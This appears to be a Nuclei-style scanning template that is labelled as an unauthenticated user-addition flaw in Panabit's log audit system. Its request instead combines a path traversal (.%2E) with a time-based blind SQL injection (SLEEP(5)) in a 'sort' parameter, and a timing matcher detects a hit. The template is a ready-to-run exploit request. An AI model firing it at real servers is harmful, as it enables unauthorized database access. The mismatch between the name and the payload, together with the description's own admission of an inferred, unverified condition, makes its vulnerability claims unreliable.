id: poc-oy9cunzuy2unugf0
info:
  name: Panabit日志审计系统singleuser_action组合未授权用户添加漏洞
  author: hacktwo
  severity: medium
  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: unauth,2025
http:
- raw:
  - 'POST /trwfe/service/.%2E/fileServer/findFileServerPage.do HTTP/1.1

    Host: {{Hostname}}

    User-Agent: python-requests/<version>

    Accept-Encoding: gzip, deflate

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8

    Accept: */*

    Connection: keep-alive


    sort=(SELECT 2005 FROM (SELECT(SLEEP(5)))IEWh)'
  redirects: false
  matchers:
  - type: dsl
    dsl:
    - status_code == 200 && duration >= 5
    condition: and
